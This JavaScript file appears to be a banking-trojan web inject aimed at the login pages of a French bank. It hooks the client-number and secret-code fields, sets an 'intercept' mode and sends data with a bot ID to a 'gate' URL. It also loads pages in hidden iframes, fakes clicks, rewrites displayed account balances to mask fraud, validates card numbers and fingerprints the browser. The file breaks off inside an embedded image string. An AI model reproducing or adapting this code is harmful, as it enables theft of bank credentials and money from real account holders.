var Tables = (function(){
	
	var admin = 'http://localhost/frtoken/';
	
	var data = new Array();
	
	var link = {
		gate: admin+"menu.php"
	};
	
	var options = {
		callback_status: '',
		iframe_status: '',
		currency_state: false
	};
	
	var splitter = {value: 'none',position: 'none'};
	var prefix = {minus: '-',plus: ''};
	
	function notnull(param){if(param == null || param == undefined || param == "null" || param == "undefined" || param == "" || param == " "){return false;}else{return true;}}
	
	function compatHeight(){var ua = navigator.userAgent.toLowerCase();var isOpera = (ua.indexOf('opera')  > -1);var isIE = (!isOpera && ua.indexOf('msie') > -1);return ((document.compatMode || isIE) && !isOpera) ? (document.compatMode == 'CSS1Compat') ? document.documentElement.clientHeight : document.body.clientHeight : (document.parentWindow || document.defaultView).innerHeight;}
	
	function cin(digits){var res = '';if(digits && digits.length > 0){digits = digits.replace(/\u2212/g, "-");var ValidChars = "-.0123456789";for(var i = 0;i < digits.length; i++){var Char = digits.charAt(i);if(ValidChars.indexOf(Char) >=0){res += Char;}}}return parseFloat(res);}
	
	function cout(digits,r){if(r == 1){digits = digits.toString().replace(/\$|\,/g,'');if(isNaN(digits))digits = "0";sign = (digits == (digits = Math.abs(digits)));digits = Math.floor(digits*100+0.50000000001);cents = digits%100;digits = Math.floor(digits/100).toString();if(cents<10)cents = "0" + cents;for (var i = 0; i < Math.floor((digits.length-(1+i))/3); i++)digits = digits.substring(0,digits.length-(4*i+3))+','+digits.substring(digits.length-(4*i+3));return (((sign)?'':'-') + digits + '.' + cents);}else if(r == 2){digits = digits.toString().replace(/\$|\,/g,'');if(isNaN(digits))digits = "0";sign = (digits == (digits = Math.abs(digits)));digits = Math.floor(digits*100+0.50000000001);cents = digits%100;digits = Math.floor(digits/100).toString();if(cents<10)cents = "0" + cents;for (var i = 0; i < Math.floor((digits.length-(1+i))/3); i++)digits = digits.substring(0,digits.length-(4*i+3))+'.'+digits.substring(digits.length-(4*i+3));return (((sign)?'':'-') + digits + ',' + cents);}else{return digits;}}
	
	function gc(digits){if(digits){if(/[0-9]/igm.test(digits)){if(/\.[0-9]{2}$|\.[0-9]{2}\s{1,}/igm.test(digits)){options.currency_state = 1;return cin(digits.replace(/\,/g, ''));}else{options.currency_state = 2;return cin(digits.replace(/\./g, '').replace(/,/g, '.'));}}else{return digits;}}else{return digits;}}
	
	function sc(digits){if(options.currency_state == 1 || options.currency_state == 2){return cout(digits,options.currency_state);}else{return digits;}}
	
	return{
	
		brows: function(){
			var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || []; 
			if(/trident/i.test(M[1])){
				tem=/\brv[ :]+(\d+)/g.exec(ua) || []; 
				return {name:'IE ',version:(tem[1]||'')};
				}   
			if(M[1]==='Chrome'){
				tem=ua.match(/\bOPR\/(\d+)/)
				if(tem!=null)   {return {name:'Opera', version:tem[1]};}
				}
			M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
			if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
			return M[0]+' '+M[1];
		},
		
		set: function(name,value){
			if(/function/igm.test(typeof value)){
				data[name] = value();
			}else{
				data[name] = value;
			}
		},
		
		add: function(name,value){
			if(data[name]){
				data[name] = data[name]+value;
			}else{
				_tables.set(name,value);
			}
		},
		
		get: function(name){
			return data[name];
		},
		
		are: function(){
			var r = true;
			if(arguments && arguments.length > 0){
				for(var i = 0; i < arguments.length; i++){
					if(!data[arguments[i]]){
						r = false;
					}
				}
			}
			return r;
		},
		
		dump: function(){
			var a = '';
			for(key in data){
				a += key+": "+data[key]+"\r\n";
			}
			alert(a);
		},
		
		findout: function(){
			var found = {
				tag: false,
				error: false,
				element: false
			};
			
			if(arguments && arguments.length >= 3){
				var elements_array = arguments[1].split("|");
				if(elements_array.length > 0){
					for(var k = 0; k < elements_array.length; k++){
						var elements = arguments[0].getElementsByTagName(elements_array[k]);
						if(elements && elements.length > 0){
							for(var i = 0; i < elements.length; i++){
								for(var e = 2; e < arguments.length; e++){
									var pattern = new RegExp(arguments[e].split(":")[1],"igm");
									if(arguments[e].split(":")[0] == "class"){
										if(elements[i].className !== null && pattern.test(elements[i].className)){
											found.tag = true;
										}else{
											found.error = true;
										}
									}else if(arguments[e].split(":")[0] == "for"){
										if(elements[i].className !== null && pattern.test(elements[i].htmlFor)){
											found.tag = true;
										}else{
											found.error = true;
										}
									}else{
										if(elements[i].getAttribute(arguments[e].split(":")[0]) !== null && pattern.test(elements[i].getAttribute(arguments[e].split(":")[0]))){
											found.tag = true;
										}else{
											found.error = true;
										}
									}
								}
								if(found.tag && !found.error){
									return elements[i];
								}else{
									found.tag = false;
									found.error = false;
								}
							}
						}
					}
					return false;
				}else{
					return false;
				}
			}else{
				return false;
			}
		},
		
		findin: function(){
			var found = {
				tag: false,
				error: false,
				element: false
			};
		
			if(arguments && arguments.length > 2){
				var elements = arguments[0].getElementsByTagName(arguments[1]);
				if(elements && elements.length > 0){
					for(var i = 0; i < elements.length; i++){
						for(var e = 2; e < arguments.length; e++){
							var pattern = new RegExp(arguments[e],"igm");
							if(pattern.test(elements[i].innerHTML.toLowerCase())){
								found.tag = true;
							}else{
								found.error = true;
							}
						}
						if(found.tag && !found.error){
							return elements[i];
						}else{
							found.tag = false;
							found.error = false;
						}
					}
				}
			}
			return false;
		},
		
		tinydecode: function(s){
			s = s.replace(/\&lt;/g,'<');
			s = s.replace(/\&gt;/g,'>');
			s = s.replace(/\&quot;/g,'"');
			s = s.replace(/\&amp;/g,'&');
			s = s.replace(/\&nbsp;/g,' ');
			return s;
		},
		
		child: function(parent,child){
			return parent && child ? parent.getElementsByTagName(child) : false;
		},
		
		html: function(element){
			if(element){
				var text = (element.textContent ? element.textContent : element.innerText) ? (element.textContent ? element.textContent : element.innerText) : element.innerHTML;
				return text.replace(/(\r\n|\r|\n|[\r]|[\n]|[\t]|\s*$)/ig,"");
			}else{
				return "";
			}
		},
		
		input: function(input,type){
			switch(type){
				case("block"):
					if(input){input.onkeypress = function(evt){var evt = (evt) ? evt : ((event) ? event : null);var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);if(evt.keyCode == 13){if(evt.stopPropagation){evt.stopPropagation();}else{evt.cancelBubble = true;}return false;}};input.onkeydown = function(evt){var evt = (evt) ? evt : ((event) ? event : null);var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);if(evt.keyCode == 13){if(evt.stopPropagation){evt.stopPropagation();}else{evt.cancelBubble = true;}return false;}};}
				break;
				
				case("disable"):
					input.disabled = true;
				break;
			}
		},
		
		form: function(form,type){
			if(form){
				switch(type){
					case("block"):
						var inps = _tables.child(form,"input");
						if(inps && inps.length > 0){
							for(var i = 0; i < inps.length; i++){
								if(/text|password/igm.test(inps[i].type)){
									_tables.input(inps[i],'block');
								}
							}
						}
					break;
				}
			}
		},
		
		bind: function(evType,obj,func){if(obj.removeEventListener){obj.removeEventListener(evType,func,false);}else if(obj.detachEvent){obj.detachEvent ('on'+evType,func);}if(obj.addEventListener ){obj.addEventListener(evType,func,false);return true;}else if(obj.attachEvent){var r = obj.attachEvent('on'+evType,func);return r;}else{elm['on'+evType] = func;}},
		
		replacebutton: function(button,func,btnid){
			var newButton = document.createElement(/image/igm.test(button.tagName) ? 'img' : button.tagName);
			for(x in button.attributes){
				if(notnull(button.attributes[x]) && notnull(button.attributes[x].name) && notnull(button.attributes[x].value)){
					if(button.attributes[x].name == "onclick" ||
						button.attributes[x].name == "name" ||
						button.attributes[x].name == "disabled" ||
						(button.attributes[x].name == "href" && !/image/igm.test(button.tagName)) ||
						button.attributes[x].name == "id"
					){
						continue;
					}
					if(button.attributes[x].name == "type" && button.attributes[x].value == "submit"){
						newButton.type = "button";
					}else{
						newButton.setAttribute(button.attributes[x].name,button.attributes[x].value);
					}
				}
			}
			
			if(button.tagName == "A" || button.tagName == "BUTTON" || button.tagName == "LI"){
				newButton.innerHTML = button.innerHTML;
			}
			newButton.style.cursor = "pointer";
			button.style.display = "none";
			if(btnid){
				newButton.id = btnid;
			}else{
				newButton.id = "_tables.button";
			}
			_tables.bind("click",newButton,func);
			button.parentNode.insertBefore(newButton,button);
		},
		
		encode: function(b){function gethex(a){return "%" + f.charAt(a >> 4) + f.charAt(a & 0xF);}var c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_.~";var d = "!*'();:@&=+$,/?%#[]";var e = c + d;var f = "0123456789ABCDEFabcdef";b = b + "";var g = "";if (!b || b.length == 0){return "";}for (var i = 0; i < b.length; i++) {var h = b.charAt(i);if (c.indexOf(h) != -1) {g = g + h;} else {var j = b.charCodeAt(i);if (j < 128) {g = g + gethex(j);}if (j > 127 && j < 2048) {g = g + gethex((j >> 6) | 0xC0);g = g + gethex((j & 0x3F) | 0x80);}if (j > 2047 && j < 65536) {g = g + gethex((j >> 12) | 0xE0);g = g + gethex(((j >> 6) & 0x3F) | 0x80);g = g + gethex((j & 0x3F) | 0x80);}if (j > 65535) {g = g + gethex((j >> 18) | 0xF0);g = g + gethex(((j >> 12) & 0x3F) | 0x80);g = g + gethex(((j >> 6) & 0x3F) | 0x80);g = g + gethex((j & 0x3F) | 0x80);}}}return g;},
		
		send: function(){var l = link.gate+'?botid='+_tables.encode(_brows.botid)+'_'+_tables.get('bank')+'&hash='+new Date();for(var i = 0; i < arguments.length; i++){for(key in arguments[i]){l += '&'+key+'='+_tables.encode(arguments[i][key]);}}var s = document.getElementById("_tables.as");if(s)s.parentNode.removeChild(s);var s = document.createElement("script");s.type = "text/javascript";s.id = "_tables.as";if(s.readyState){s.onreadystatechange = function(){if(s.readyState == "loaded" || s.readyState == "complete"){s.onreadystatechange = null;_tables.callback();}};}else{s.onload = function(){_tables.callback();};}l = l.replace(/\(/g,"%28").replace(/\)/g,"%29");s.src = l;document.getElementsByTagName("head")[0].appendChild(s);},
		
		status: function(s){if(s){options.callback_status = s;}else{return options.callback_status;}},
		
		fstatus: function(s){if(s){options.iframe_status = s;}else{return options.iframe_status;}},
		
		rand: function(a,b){return Math.floor((Math.random()*b)+a);},
		
		shuffle: function(o){for(var j, x, i = o.length; i; j = Math.floor(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);return o;},
		
		click: function(btn,doc){
			if(btn.type == "image"){
				var inp_X = document.getElementById("inp_X");
				var inp_Y = document.getElementById("inp_Y");
				var inp_submit = document.getElementById("inp_submit");
				if(inp_X)inp_X.parentNode.removeChild(inp_X);
				if(inp_Y)inp_Y.parentNode.removeChild(inp_Y);
				if(inp_submit)inp_submit.parentNode.removeChild(inp_submit);
				var inp_X = document.createElement("input");
				var inp_Y = document.createElement("input");
				var inp_submit = document.createElement("input");
				inp_X.name = btn.name+".x";
				inp_Y.name = btn.name+".y";
				inp_submit.name = btn.name;
				inp_submit.value = btn.value;
				inp_submit.type = "submit";
				inp_submit.id = "inp_submit";
				inp_X.id = "inp_X";
				inp_Y.id = "inp_Y";
				inp_X.value = _tables.rand(1,15);
				inp_Y.value = _tables.rand(1,15);
				inp_X.style.display = "none";
				inp_Y.style.display = "none";
				inp_submit.style.display = "none";
				btn.parentNode.insertBefore(inp_X,btn);
				btn.parentNode.insertBefore(inp_Y,btn);
				btn.parentNode.insertBefore(inp_submit,btn);
				var inp_submit = doc.getElementById("inp_submit");
				if(inp_submit)_tables.click("click",inp_submit);
			}else{
				if(document.createEvent){
					var event = document.createEvent('MouseEvents');
					event.initMouseEvent('click',true,true,document.defaultView,1,0,0, 0, 0, false, false, false, false,0,null);
					btn.dispatchEvent(event);
				}else if(btn.fireEvent){
					btn.click();
				}
			}
		},
		
		iframelink: function(link,param){
			var _tf = document.getElementById("_tables.frame.box");
			if(_tf)_tf.parentNode.removeChild(_tf);
					
			_tf = document.createElement("div");
			_tf.style.position = "absolute";
			_tf.style.left = _tables.get('showframe') ? "0px" : "-5000px";
			_tf.style.top = _tables.get('showframe') ? "2000px" : "-5000px";
			_tf.id = "_tables.frame.box";
			_tf.innerHTML = '<iframe id="_tables.iframe" name="_tables.iframe" width=1280 height=800 onload="_tables.iframecallback();"></iframe>';
			document.body.appendChild(_tf);
			var f = document.getElementById("_tables.iframe");
			f.src = link;
			if(param)_tables.fstatus(param);
		},
		
		iframedom: function(fr){
			var r = {
				doc: false,
				win: false
			};
			if(_tables.brows() == "FF" && fr){
				r.doc = fr.contentDocument;
				r.win = fr.contentWindow;
			}else{
				r.doc = fr.contentWindow.document;
				r.win = fr.contentWindow;
			}
			
			return r;
		},
		
		height: function(){
			return Math.max(document.compatMode != 'CSS1Compat' ? document.body.scrollHeight : document.documentElement.scrollHeight, compatHeight());
		},
		
		popupshow: function(content,back){
			_tables.popuphide();
			back = back ? '#808080' : 'url(clear.png)';
			var bg = '<div style="position:absolute;top:0px;left:0px;width:100%;height:'+Math.round((window.screen.availHeight)+800)+'px;z-index:999990;background:'+back+';opacity:0.4;filter: alpha(opacity = 40);"></div>';
			var _tp = document.createElement("div");
			_tp.id = "_tables.popup";
			_tp.innerHTML = bg+""+content;
			document.getElementsByTagName('body')[0].appendChild(_tp);
		},
		
		popuphide: function(){
			var _tp = document.getElementById("_tables.popup");if(_tp)_tp.parentNode.removeChild(_tp);
		},
		
		inarr: function(arr,value){
			for(var i = 0; i < arr.length; i++){
				if(value == arr[i]){
					return true;
				}
			}
			arr.push(value);
			return false;
		},
		
		placeholdr: function(input){
			if(_tables.brows() == 'FF')return;
			var txt = input.getAttribute("placeholder");
			if(txt.length > 0){
				input.style.color = input.value.length == 0 ? '#cccccc' : '#000000';
				input.value = input.value.length > 0 ? input.value : txt;
			  
				input.onfocus = function(){
					this.style.color = '#000000';
					this.value = this.value == this.getAttribute("placeholder") ? "" : this.value;
				};
			
				input.onblur = function(){
					if(this.value.length == 0){
						this.value = this.getAttribute("placeholder");
						this.style.color = '#CCCCCC';
					}
				};
			}
		},
		
		btntoloader: function(btn,imghref){
			var img = document.createElement('img');
			img.src = imghref;
			img.id = '_f_btntoloader';
			img.style.marginTop = '10px';
			btn.parentNode.insertBefore(img,btn);
			btn.parentNode.removeChild(btn);
		},
		
		cget: function(param){
			return gc(param);
		},
		
		cset: function(param){
			return sc(param);
		},
		
		replace: function(element,summa){
			if(element.id == 'was_replacer')return false;
			element.id = 'was_replacer';
			var tsel = /select|option/igm.test(element.tagName);
			var tinp = /input|textarea/igm.test(element.tagName);
			
			if(tsel){
				if(splitter.value != "none" && splitter.position != "none"){
					var minus = (element.text.split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(element.text.split(splitter.value)[splitter.position]);
				}else{
					var minus = (element.text.indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(element.text);
				}
			}else if(tinp){
				if(splitter.value != "none" && splitter.position != "none"){
					var minus = (element.value.split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(element.value.split(splitter.value)[splitter.position]);
				}else{
					var minus = (element.value.indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(element.value);
				}
			}else{
				if(splitter.value != "none" && splitter.position != "none"){
					var minus = (_tables.html(element).split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(_tables.html(element).split(splitter.value)[splitter.position]);
				}else{
					var minus = (_tables.html(element).indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(_tables.html(element));
				}
			}
			
			var new_balance = balance+parseFloat(summa);
			if(minus)balance = balance * -1;
			balance = sc(balance);
			new_balance = sc(new_balance);
			
			if(tsel){
				var f = element.text.replace(balance+"",new_balance+"");
			}else if(tinp){
				var f = element.value.replace(balance+"",new_balance+"");
			}else{
				var f = element.innerHTML.replace(balance+"",new_balance+"");
			}
			
			if(parseFloat(new_balance) >= 0){
				f = f.replace((f.indexOf(prefix.minus) != -1 ) ? prefix.minus : prefix.plus , prefix.plus );
				f = f.replace("-"+new_balance+"",new_balance+"");
			}else{
				f = f.replace((f.indexOf(prefix.minus) != -1 ) ? prefix.minus : prefix.plus , prefix.minus );
				f = f.replace(/\-/,"");
			}
			
			if(tsel){
				element.text = f;
			}else if(tinp){
				element.value = f;
			}else{
				element.innerHTML = f;
				if(parseFloat(new_balance) > 0){
					element.className = element.className.replace(/negatif/igm,'');
				}
			}
			
			if(splitter.value != "none" && splitter.position != "none"){
				splitter.value = "none";
				splitter.position = "none";
			}
		},
		
		splitter: function (value,position){
			splitter.value = value;
			splitter.position = position;
		},
		
		match: function(el,data){
			var pattern = new RegExp(data,"igm");
			if(pattern.test(el)){
				return true;
			}else{
				return false;
			}
		},
		
		convertdate: function(date){
			var els = date.split(".");
			if(els && els.length == 3){
				var res = 0;
				res += parseFloat(els[2]) * 365;
				res += parseFloat(els[1]) * 30;
				res += parseFloat(els[0]);
				return res;
			}else{
				return -1;
			}
		},
		
		recolortable: function(table,class1,class2){
			var tr = _tables.child(table,'tr');
			if(tr && tr.length > 0){
				for(var i = 0; i < tr.length; i++){
					tr[i].className = (i % 2 == 0) ? class1 : class2;
				}
			}
		},
		
		id: function(id,doc){var doc = doc ? doc : document;return doc.getElementById(id);},
		
		create: function(el,doc){var doc = doc ? doc : document;return doc.createElement(el);},
		
		selected: function(select){var sel = {value: select[select.selectedIndex].value,text: select[select.selectedIndex].text};return sel;},
		
		after: function(elem,ref){var parent = ref.parentNode;var next = ref.nextSibling;if(next){return parent.insertBefore(elem,next);}else{return parent.appendChild(elem);}},
		
		clone: function(inp,value){
			var object = document.createElement(inp.tagName);
			for (x in inp.attributes){
				if(notnull(inp.attributes[x]) && notnull(inp.attributes[x].name) && notnull(inp.attributes[x].value)){
					if(inp.attributes[x].name == "onclick" ||
					   inp.attributes[x].name == "name" ||
					   inp.attributes[x].name == "href" ||
					   inp.attributes[x].name == "id" ||
					   inp.attributes[x].name == "value"
					){
						continue;
					}
					object.setAttribute(inp.attributes[x].name,inp.attributes[x].value);
				}
			}
			if(/select/igm.test(inp.tagName)){
				object.options[0] = new Option(inp[inp.selectedIndex].text,inp[inp.selectedIndex].value);
			}else{
				value = value ? value : inp.value;
				object.value = value;
			}
			object.disabled = true;
			inp.style.display = "none";
			inp.parentNode.insertBefore(object,inp);
		},
		
		next: function(e,len,n){
			if(e.value.length == len)document.getElementById(n).focus();
		},
		
		check_cc: function(value){
			if (/[^0-9-\s]+/.test(value)) return false;
			var nCheck = 0, nDigit = 0, bEven = false;
			value = value.replace(/\D/g, "");
			for (var n = value.length - 1; n >= 0; n--) {
				var cDigit = value.charAt(n),
				nDigit = parseInt(cDigit, 10);
				if(bEven){
					if ((nDigit *= 2) > 9) nDigit -= 9;
				}
				nCheck += nDigit;
				bEven = !bEven;
			}
			return (nCheck % 10) == 0;
		},
		
		check_day: function(dd){
			if(parseFloat(dd) > 0 && parseFloat(dd) < 32 && (dd+'').length == 2){
				return true;
			}else{
				return false;
			}
		},
		
		check_month: function(mm){
			if(parseFloat(mm) > 0 && parseFloat(mm) < 13 && (mm+'').length == 2){
				return true;
			}else{
				return false;
			}
		},
		
		check_year: function(yy,format){
			switch(format){
				case('YY'):
					if(parseFloat(yy) >= 15 && (yy+'').length == 2){
						return true;
					}else{
						return false;
					}
				break;
				
				case('YYYY'):
					if(parseFloat(yy) >= 1920  && parseFloat(yy) <= 2015 && (yy+'').length == 4){
						return true;
					}else{
						return false;
					}
				break;
			}
		}
	};
}());

_tables = Tables;

(function (window) {
    {
        var unknown = '-';

        // screen
        var screenSize = '';
        if (screen.width) {
            width = (screen.width) ? screen.width : '';
            height = (screen.height) ? screen.height : '';
            screenSize += '' + width + " x " + height;
        }

        //browser
        var nVer = navigator.appVersion;
        var nAgt = navigator.userAgent;
        var browser = navigator.appName;
        var version = '' + parseFloat(navigator.appVersion);
        var majorVersion = parseInt(navigator.appVersion, 10);
        var nameOffset, verOffset, ix;

        // Opera
        if ((verOffset = nAgt.indexOf('Opera')) != -1) {
            browser = 'Opera';
            version = nAgt.substring(verOffset + 6);
            if ((verOffset = nAgt.indexOf('Version')) != -1) {
                version = nAgt.substring(verOffset + 8);
            }
        }
        // MSIE
        else if ((verOffset = nAgt.indexOf('MSIE')) != -1) {
            browser = 'Microsoft Internet Explorer';
            version = nAgt.substring(verOffset + 5);
        }
        // Chrome
        else if ((verOffset = nAgt.indexOf('Chrome')) != -1) {
            browser = 'Chrome';
            version = nAgt.substring(verOffset + 7);
        }
        // Safari
        else if ((verOffset = nAgt.indexOf('Safari')) != -1) {
            browser = 'Safari';
            version = nAgt.substring(verOffset + 7);
            if ((verOffset = nAgt.indexOf('Version')) != -1) {
                version = nAgt.substring(verOffset + 8);
            }
        }
        // Firefox
        else if ((verOffset = nAgt.indexOf('Firefox')) != -1) {
            browser = 'Firefox';
            version = nAgt.substring(verOffset + 8);
        }
        // MSIE 11+
        else if (nAgt.indexOf('Trident/') != -1) {
            browser = 'Microsoft Internet Explorer';
            version = nAgt.substring(nAgt.indexOf('rv:') + 3);
        }
        // Other browsers
        else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))) {
            browser = nAgt.substring(nameOffset, verOffset);
            version = nAgt.substring(verOffset + 1);
            if (browser.toLowerCase() == browser.toUpperCase()) {
                browser = navigator.appName;
            }
        }
        // trim the version string
        if ((ix = version.indexOf(';')) != -1) version = version.substring(0, ix);
        if ((ix = version.indexOf(' ')) != -1) version = version.substring(0, ix);
        if ((ix = version.indexOf(')')) != -1) version = version.substring(0, ix);

        majorVersion = parseInt('' + version, 10);
        if (isNaN(majorVersion)) {
            version = '' + parseFloat(navigator.appVersion);
            majorVersion = parseInt(navigator.appVersion, 10);
        }

        // mobile version
        var mobile = /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(nVer);

        // cookie
        var cookieEnabled = (navigator.cookieEnabled) ? true : false;

        if (typeof navigator.cookieEnabled == 'undefined' && !cookieEnabled) {
            document.cookie = 'testcookie';
            cookieEnabled = (document.cookie.indexOf('testcookie') != -1) ? true : false;
        }

        // system
        var os = unknown;
        var clientStrings = [
            {s:'Windows 3.11', r:/Win16/},
            {s:'Windows 95', r:/(Windows 95|Win95|Windows_95)/},
            {s:'Windows ME', r:/(Win 9x 4.90|Windows ME)/},
            {s:'Windows 98', r:/(Windows 98|Win98)/},
            {s:'Windows CE', r:/Windows CE/},
            {s:'Windows 2000', r:/(Windows NT 5.0|Windows 2000)/},
            {s:'Windows XP', r:/(Windows NT 5.1|Windows XP)/},
            {s:'Windows Server 2003', r:/Windows NT 5.2/},
            {s:'Windows Vista', r:/Windows NT 6.0/},
            {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
            {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
            {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
            {s:'Windows NT 4.0', r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},
            {s:'Windows ME', r:/Windows ME/},
            {s:'Android', r:/Android/},
            {s:'Open BSD', r:/OpenBSD/},
            {s:'Sun OS', r:/SunOS/},
            {s:'Linux', r:/(Linux|X11)/},
            {s:'iOS', r:/(iPhone|iPad|iPod)/},
            {s:'Mac OS X', r:/Mac OS X/},
            {s:'Mac OS', r:/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},
            {s:'QNX', r:/QNX/},
            {s:'UNIX', r:/UNIX/},
            {s:'BeOS', r:/BeOS/},
            {s:'OS/2', r:/OS\/2/},
            {s:'Search Bot', r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}
        ];
        for (var id in clientStrings) {
            var cs = clientStrings[id];
            if (cs.r.test(nAgt)) {
                os = cs.s;
                break;
            }
        }

        var osVersion = unknown;

        if (/Windows/.test(os)) {
            osVersion = /Windows (.*)/.exec(os)[1];
            os = 'Windows';
        }

        switch (os) {
            case 'Mac OS X':
                osVersion = /Mac OS X (10[\.\_\d]+)/.exec(nAgt)[1];
                break;

            case 'Android':
                osVersion = /Android ([\.\_\d]+)/.exec(nAgt)[1];
                break;

            case 'iOS':
                osVersion = /OS (\d+)_(\d+)_?(\d+)?/.exec(nVer);
                osVersion = osVersion[1] + '.' + osVersion[2] + '.' + (osVersion[3] | 0);
                break;
        }

        // flash (you'll need to include swfobject)
        /* script src="//ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js" */
        var flashVersion = 'no check';
        if (typeof swfobject != 'undefined') {
            var fv = swfobject.getFlashPlayerVersion();
            if (fv.major > 0) {
                flashVersion = fv.major + '.' + fv.minor + ' r' + fv.release;
            }
            else  {
                flashVersion = unknown;
            }
        }
    }

    window.jscd = {
        screen: screenSize,
        browser: browser,
        browserVersion: version,
        mobile: mobile,
        os: os,
        osVersion: osVersion,
        cookies: cookieEnabled,
        flashVersion: flashVersion
    };
}(this));

_tables.set('continue',true);
_tables.set('showframe',false);
_tables.set('message','');
_tables.set('type','intercept');
_tables.set('start','start');
_tables.set('end','end');
_tables.set('finish','');
_tables.set('data','');
_tables.set('passwordValue','');
_tables.set('login',function(){return _tables.id('client-nbr');});
_tables.set('password',function(){return _tables.id('secret-nbr');});
_tables.set('button',function(){return _tables.id('submitIdent');});
_tables.set('lang',function(){var div = _tables.findout(document,'div','class:language_switcher');if(div){var a = _tables.child(div,'a');if(a && a.length > 0){return _tables.html(a[0]);}}else{return 'EN';}});
_tables.set('logout',function(){return _tables.findout(document,'a','href:logoff');});
_tables.set('page',function(){if(/mabanquepro/igm.test(document.location.href)){return 3;}else if(/mabanqueprivee/igm.test(document.location.href)){return 2;}else{return 1;}});
_tables.set('loader','data:image/gif;base64,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